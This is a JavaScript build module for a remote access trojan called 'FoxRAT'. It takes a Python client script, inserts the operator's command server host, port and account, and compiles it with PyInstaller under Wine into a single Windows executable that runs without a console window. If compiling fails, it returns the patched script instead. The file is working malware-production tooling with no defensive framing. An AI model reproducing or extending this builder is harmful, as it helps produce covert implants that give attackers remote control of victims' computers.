const { execSync } = require('child_process');
const path = require('path');
const fs = require('fs');
const os = require('os');

const WINE_PYTHON = 'C:\\Python311\\python.exe';

exports.build = function(options) {
    const { filename, host, port, account } = options;
    const safeName = (filename || 'FoxRAT').replace(/[^a-zA-Z0-9_-]/g, '') || 'FoxRAT';
    const tmpDir = fs.mkdtempSync(path.join(os.tmpdir(), 'foxrat_build_'));
    const clientPyPath = path.join(__dirname, 'client_py', 'client.py');
    const clientSource = fs.readFileSync(clientPyPath, 'utf8');

    const modified = clientSource
        .replace(/SERVER_HOST = ".*?"/, `SERVER_HOST = "${host || '127.0.0.1'}"`)
        .replace(/SERVER_PORT = \d+/, `SERVER_PORT = ${Number(port) || 3000}`)
        .replace(/ACCOUNT = ".*?"/, `ACCOUNT = "${account || 'default'}"`);

    fs.writeFileSync(path.join(tmpDir, 'client.py'), modified);

    try {
        const specFile = path.join(tmpDir, 'client.spec');
        const pyinstallerCmd = [
            'xvfb-run', 'wine64', WINE_PYTHON,
            '-m', 'PyInstaller',
            '--onefile',
            '--noconsole',
            '--name', safeName,
            '--distpath', tmpDir,
            '--workpath', path.join(tmpDir, 'build'),
            '--specpath', tmpDir,
            '--clean',
            '-y',
            path.join(tmpDir, 'client.py').replace(/\//g, '\\')
        ].join(' ');

        execSync(pyinstallerCmd, {
            cwd: tmpDir,
            timeout: 120000,
            stdio: 'pipe',
            env: { ...process.env, WINEDEBUG: '-all' }
        });

        const wineOut = path.join(tmpDir, safeName + '.exe');
        const unixOut = path.join(tmpDir, safeName + '.exe');
        const possiblePaths = [
            unixOut,
            path.join(tmpDir, safeName + '.exe'),
            path.join(tmpDir, 'dist', safeName + '.exe'),
        ];

        let exePath = null;
        for (const p of possiblePaths) {
            if (fs.existsSync(p)) { exePath = p; break; }
        }

        if (exePath) {
            const data = fs.readFileSync(exePath);
            cleanup(tmpDir);
            return { data, ext: '.exe' };
        }
    } catch (e) {
        console.log('[Builder] Wine PyInstaller failed:', e.message?.substring(0, 200));
    }

    console.log('[Builder] Falling back to .py');
    const result = { data: Buffer.from(modified, 'utf8'), ext: '.py' };
    cleanup(tmpDir);
    return result;
};

function cleanup(dir) {
    try { fs.rmSync(dir, { recursive: true, force: true }); } catch(_) {}
}
